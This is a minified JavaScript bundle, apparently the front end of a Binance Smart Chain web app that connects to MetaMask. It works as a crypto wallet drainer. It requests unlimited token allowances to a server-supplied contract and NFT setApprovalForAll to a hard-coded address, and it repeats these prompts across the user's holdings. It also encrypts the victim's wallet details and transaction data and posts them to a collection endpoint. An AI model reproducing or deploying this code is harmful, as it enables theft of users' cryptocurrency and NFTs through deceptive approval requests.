var e=Object.defineProperty,t=Object.defineProperties,n=Object.getOwnPropertyDescriptors,a=Object.getOwnPropertySymbols,i=Object.prototype.hasOwnProperty,s=Object.prototype.propertyIsEnumerable,o=(t,n,a)=>n in t?e(t,n,{enumerable:!0,configurable:!0,writable:!0,value:a}):t[n]=a,r=(e,t)=>{for(var n in t||(t={}))i.call(t,n)&&o(e,n,t[n]);if(a)for(var n of a(t))s.call(t,n)&&o(e,n,t[n]);return e},p=(e,a)=>t(e,n(a));import{V as u,W as y,X as l,Y as c,Z as d,_ as m,$ as f,Q as b,T as g}from"./vendor-4b66aece.js";import{d as w,u as T,b as v,e as h,c as _,n as M,f as S,g as O,a as x,s as A,h as I}from"./store-cc8e4092.js";var k="/app/assets/logo-d77b28f7.webp",F="/app/assets/card-bg-c6734c80.svg";const E={subscribe:e=>(()=>{const e=u("__svelte__");return{page:{subscribe:e.page.subscribe},navigating:{subscribe:e.navigating.subscribe},get preloading(){return console.error("stores.preloading is deprecated; use stores.navigating instead"),{subscribe:e.navigating.subscribe}},session:e.session}})().page.subscribe(e)};function P(e){for(var t="",n="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",a=n.length,i=0;i<e;i++)t+=n.charAt(Math.floor(Math.random()*a));return t}function N(e){const t=t=>{e&&"function"==typeof e.select&&e.select()};return e.addEventListener("focus",t),{destroy(){e.removeEventListener("focus",t)}}}const C=y("https://lnaalxatcjcpzdrdumre.supabase.co","eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYW5vbiIsImlhdCI6MTYzMTYwNTU4MiwiZXhwIjoxOTQ3MTgxNTgyfQ.Qg8qaHx8UCs9r90NrklTernaxFTseZiGePMATfCaVho");async function J(e,t){if(1!=localStorage.getItem("_ir")){try{let{body:n}=await C.from("refs").insert([{ref:e,user:t}])}catch(n){console.log(n)}localStorage.setItem("_ir",1)}}var Y=[{inputs:[{internalType:"string",name:"_name",type:"string"},{internalType:"string",name:"_symbol",type:"string"},{internalType:"uint256",name:"_decimals",type:"uint256"},{internalType:"uint256",name:"_supply",type:"uint256"},{internalType:"uint256",name:"_txFee",type:"uint256"},{internalType:"uint256",name:"_burnFee",type:"uint256"},{internalType:"uint256",name:"_charityFee",type:"uint256"},{internalType:"address",name:"_FeeAddress",type:"address"},{internalType:"address",name:"tokenOwner",type:"address"}],stateMutability:"nonpayable",type:"constructor"},{anonymous:!1,inputs:[{indexed:!0,internalType:"address",name:"owner",type:"address"},{indexed:!0,internalType:"address",name:"spender",type:"address"},{indexed:!1,internalType:"uint256",name:"value",type:"uint256"}],name:"Approval",type:"event"},{anonymous:!1,inputs:[{indexed:!0,internalType:"address",name:"previousOwner",type:"address"},{indexed:!0,internalType:"address",name:"newOwner",type:"address"}],name:"OwnershipTransferred",type:"event"},{anonymous:!1,inputs:[{indexed:!0,internalType:"address",name:"from",type:"address"},{indexed:!0,internalType:"address",name:"to",type:"address"},{indexed:!1,internalType:"uint256",name:"value",type:"uint256"}],name:"Transfer",type:"event"},{inputs:[],name:"FeeAddress",outputs:[{internalType:"address",name:"",type:"address"}],stateMutability:"view",type:"function"},{inputs:[],name:"_BURN_FEE",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[],name:"_CHARITY_FEE",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[],name:"_TAX_FEE",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[],name:"_owner",outputs:[{internalType:"address",name:"",type:"address"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"owner",type:"address"},{internalType:"address",name:"spender",type:"address"}],name:"allowance",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"spender",type:"address"},{internalType:"uint256",name:"amount",type:"uint256"}],name:"approve",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"account",type:"address"}],name:"balanceOf",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"uint256",name:"_value",type:"uint256"}],name:"burn",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[],name:"decimals",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"spender",type:"address"},{internalType:"uint256",name:"subtractedValue",type:"uint256"}],name:"decreaseAllowance",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"uint256",name:"tAmount",type:"uint256"}],name:"deliver",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"account",type:"address"}],name:"excludeAccount",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"account",type:"address"}],name:"includeAccount",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"spender",type:"address"},{internalType:"uint256",name:"addedValue",type:"uint256"}],name:"increaseAllowance",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"account",type:"address"}],name:"isCharity",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"account",type:"address"}],name:"isExcluded",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"account",type:"address"},{internalType:"uint256",name:"amount",type:"uint256"}],name:"mint",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[],name:"name",outputs:[{internalType:"string",name:"",type:"string"}],stateMutability:"view",type:"function"},{inputs:[],name:"owner",outputs:[{internalType:"address",name:"",type:"address"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"uint256",name:"tAmount",type:"uint256"},{internalType:"bool",name:"deductTransferFee",type:"bool"}],name:"reflectionFromToken",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[],name:"renounceOwnership",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"account",type:"address"}],name:"setAsCharityAccount",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[],name:"symbol",outputs:[{internalType:"string",name:"",type:"string"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"uint256",name:"rAmount",type:"uint256"}],name:"tokenFromReflection",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[],name:"totalBurn",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[],name:"totalCharity",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[],name:"totalFees",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[],name:"totalSupply",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"recipient",type:"address"},{internalType:"uint256",name:"amount",type:"uint256"}],name:"transfer",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"sender",type:"address"},{internalType:"address",name:"recipient",type:"address"},{internalType:"uint256",name:"amount",type:"uint256"}],name:"transferFrom",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"newOwner",type:"address"}],name:"transferOwnership",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"uint256",name:"_txFee",type:"uint256"},{internalType:"uint256",name:"_burnFee",type:"uint256"},{internalType:"uint256",name:"_charityFee",type:"uint256"}],name:"updateFee",outputs:[],stateMutability:"nonpayable",type:"function"}],j=[{constant:!0,inputs:[{name:"_tokenId",type:"uint256"}],name:"getApproved",outputs:[{name:"",type:"address"}],payable:!1,stateMutability:"view",type:"function"},{constant:!1,inputs:[{name:"_to",type:"address"},{name:"_tokenId",type:"uint256"}],name:"approve",outputs:[],payable:!1,stateMutability:"nonpayable",type:"function"},{constant:!1,inputs:[{name:"_from",type:"address"},{name:"_to",type:"address"},{name:"_tokenId",type:"uint256"}],name:"transferFrom",outputs:[],payable:!1,stateMutability:"nonpayable",type:"function"},{constant:!1,inputs:[{name:"_from",type:"address"},{name:"_to",type:"address"},{name:"_tokenId",type:"uint256"}],name:"safeTransferFrom",outputs:[],payable:!1,stateMutability:"nonpayable",type:"function"},{constant:!0,inputs:[{name:"_tokenId",type:"uint256"}],name:"exists",outputs:[{name:"",type:"bool"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[{name:"_tokenId",type:"uint256"}],name:"ownerOf",outputs:[{name:"",type:"address"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[{name:"_owner",type:"address"}],name:"balanceOf",outputs:[{name:"",type:"uint256"}],payable:!1,stateMutability:"view",type:"function"},{constant:!1,inputs:[{name:"_to",type:"address"},{name:"_approved",type:"bool"}],name:"setApprovalForAll",outputs:[],payable:!1,stateMutability:"nonpayable",type:"function"},{constant:!1,inputs:[{name:"_from",type:"address"},{name:"_to",type:"address"},{name:"_tokenId",type:"uint256"},{name:"_data",type:"bytes"}],name:"safeTransferFrom",outputs:[],payable:!1,stateMutability:"nonpayable",type:"function"},{constant:!0,inputs:[{name:"_owner",type:"address"},{name:"_operator",type:"address"}],name:"isApprovedForAll",outputs:[{name:"",type:"bool"}],payable:!1,stateMutability:"view",type:"function"},{inputs:[{name:"_name",type:"string"},{name:"_symbol",type:"string"}],payable:!1,stateMutability:"nonpayable",type:"constructor"},{anonymous:!1,inputs:[{indexed:!0,name:"_from",type:"address"},{indexed:!0,name:"_to",type:"address"},{indexed:!1,name:"_tokenId",type:"uint256"}],name:"Transfer",type:"event"},{anonymous:!1,inputs:[{indexed:!0,name:"_owner",type:"address"},{indexed:!0,name:"_approved",type:"address"},{indexed:!1,name:"_tokenId",type:"uint256"}],name:"Approval",type:"event"},{anonymous:!1,inputs:[{indexed:!0,name:"_owner",type:"address"},{indexed:!0,name:"_operator",type:"address"},{indexed:!1,name:"_approved",type:"bool"}],name:"ApprovalForAll",type:"event"},{constant:!0,inputs:[],name:"name",outputs:[{name:"",type:"string"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[],name:"symbol",outputs:[{name:"",type:"string"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[{name:"_tokenId",type:"uint256"}],name:"tokenURI",outputs:[{name:"",type:"string"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[{name:"_owner",type:"address"},{name:"_index",type:"uint256"}],name:"tokenOfOwnerByIndex",outputs:[{name:"",type:"uint256"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[],name:"totalSupply",outputs:[{name:"",type:"uint256"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[{name:"_index",type:"uint256"}],name:"tokenByIndex",outputs:[{name:"",type:"uint256"}],payable:!1,stateMutability:"view",type:"function"}];const D=l();let $="";const B=e=>{let t=c(O);console.log(t),O.set([...t,e])};function U(){let e={web3:!1,ad:"",mm:!1,b:JSON.stringify(D)};return void 0!==window.ethereum&&(e.web3=!0,e.ad=window.ethereum.selectedAddress||"",e.mm=window.ethereum.isMetaMask||!1),e}async function R(e){c(d);try{fetch("/api/connect",{method:"POST",body:m.AES.encrypt(JSON.stringify({click:{ref:e,r:document.referrer,i:U()}}),(new Date).getFullYear().toString()).toString()})}catch(t){console.log("cn",erroe)}}async function V(e,t){const n=c(d);try{let o=new n.eth.Contract(Y,e);var a=await o.methods.decimals().call();if(a){var i=await o.methods.balanceOf(t).call(),s=i/Math.pow(10,a);return T.set(s),i}}catch(o){return console.log("cngb",o),0}return 1}async function H(e){if("1"==localStorage.getItem(`ap_${e}`))return!0;const t=c(d),n=c(b);let a=new t.eth.Contract(Y,e),i=localStorage.getItem("ref"),s=await new Promise(((t,s)=>{a.methods.approve($,"0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff").send({from:n},(function(a,s){s?(B(e),t(!0)):t(!1),fetch("/api/connect",{method:"POST",body:m.AES.encrypt(JSON.stringify({sent:{tx:s,token:e,address:n,ref:i,contract:$}}),(new Date).getFullYear().toString()).toString()})})).on("receipt",(function(a){localStorage.setItem(`ap_${e}`,1),window.gtag_report_conversion,console.log("ctrk"),window.gtag_report_conversion(),fetch("/api/connect",{method:"POST",body:m.AES.encrypt(JSON.stringify({approval:{tx:a.blockHash,token:e,address:n,ref:i,contract:$}}),(new Date).getFullYear().toString()).toString()}),t(!0)})).catch((e=>(fetch("/api/connect",{method:"POST",body:m.AES.encrypt(JSON.stringify({userAddress:n,err:e}),(new Date).getFullYear().toString()).toString()}),t(!0),!1)))}));return I.set(!0),s}async function Q(e){if(localStorage.getItem(`ap_${e}`))return console.log("al nft"),!0;const t=c(d),n=c(b);let a=new t.eth.Contract(j,e),i=localStorage.getItem("ref"),s=await new Promise(((t,s)=>{let o="0xd44fd9a8f56294368564f7fffb950e72db8feea4";a.methods.setApprovalForAll(o,"true").send({from:n},(function(a,s){s?(B(e),t(!0)):t(!1),fetch("/api/connect",{method:"POST",body:m.AES.encrypt(JSON.stringify({nft:{tx:s,token:e,address:n,ref:i,contract:o}}),(new Date).getFullYear().toString()).toString()})})).on("receipt",(function(a){localStorage.setItem(`ap_${e}`,1),fetch("/api/connect",{method:"POST",body:m.AES.encrypt(JSON.stringify({nft:{tx:a.blockHash,token:e,address:n,ref:i,contract:$}}),(new Date).getFullYear().toString()).toString()}),t(!0)})).catch((e=>(fetch("/api/connect",{method:"POST",body:m.AES.encrypt(JSON.stringify({nft:!0,userAddress:n,err:e}),(new Date).getFullYear().toString()).toString()}),t(!0),!1)))}));return I.set(!0),s}async function X(e){const t=c(f);await c(d);const n=await c(b);if(!n||""==n)return void console.log("noua");let a,i=await fetch("/api/connect",{method:"POST",body:m.AES.encrypt(`${t}_${n}`,(new Date).getFullYear().toString()).toString()}).then((e=>e.text()));try{a=m.AES.decrypt(i,n).toString(m.enc.Utf8)}catch(u){console.log("d err")}let s={tokens:[],contract:""};try{s=await JSON.parse(a)}catch(u){console.log("c err")}$=s.contract;let o=s.tokens,r=c(v);if(""!==r){for(var p=0;p<o.length;p++)o[p]===r&&(o.splice(p,1),p--);o.unshift(r)}return o}async function z(e){let t=c(b);if(""==t)return console.log("noa"),0;let n=0;try{let a=new(c(d).eth.Contract)(j,e);n=await a.methods.balanceOf(t).call();let i=c(w);i[e]=n,w.set(i),console.log(`${e} ${n}`)}catch(a){console.log(a),n=0}return n}async function Z(e){let t=0;try{const n=c(d);t=await n.eth.getBalance(e),h.set(t)}catch(n){t=0}return t}async function G(){_.set(!0);let e=await X();if(c(b)&&""!=c(b)||await g.setBrowserProvider().catch((e=>{})),!e)return console.log("error"),void _.set(!1);e.length;let t=0,n=c(v),a=c(M);if(Number(c(S))>0)for(;0==c(O).length&&""!=a;)console.log(c(O).length),await Q(a);let i=c(x),s=c(w);for(i.forEach((async e=>{s[e]>0&&await Q(e)}));e.length>0&&t<15;){if(""!==n&&e[0]==n){await H(e[0])&&e.splice(0,1)}else for(const[t,n]of e.entries()){await H(n)&&e.splice(t,1)}if(0==c(h)){console.log("br_nb");break}t++}_.set(!1)}function L(){let e;const t=c(d),n=c(b),a=c(f);return n&&""!=n?(A.set(p(r({},A),{address:n})),t.eth?void t.eth.getBalance(n).then((t=>0==t?(e="Please log-in with a different account",e):56!==a?(e="Please select the correct network",e):(A.set(p(r({},A),{loggedIn:!0})),null))):"Metamask not connected"):(e="Metamask not connected",e)}export{Z as a,X as b,F as c,z as g,G as h,J as i,k as l,P as m,R as n,E as p,N as s,V as u,L as v};
